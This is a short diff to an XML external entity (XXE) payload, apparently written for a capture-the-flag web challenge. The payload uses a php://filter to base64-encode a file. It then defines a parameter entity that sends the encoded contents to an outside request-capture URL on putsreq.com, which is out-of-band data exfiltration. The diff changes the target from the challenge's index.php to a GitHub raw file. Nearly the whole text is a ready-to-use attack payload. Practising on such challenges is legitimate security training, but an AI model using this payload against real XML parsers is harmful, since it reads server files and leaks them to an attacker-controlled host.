@@ -1,4 +1,4 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php">
+<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=https://raw.githubusercontent.com/pszot/publicscripts/0ff2b453e03e7ddb55f6e145e643f4ac748fd946/xml.xml">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://putsreq.com/jcVVqYcNb9zESnp2Fqws?%data;'>">
 
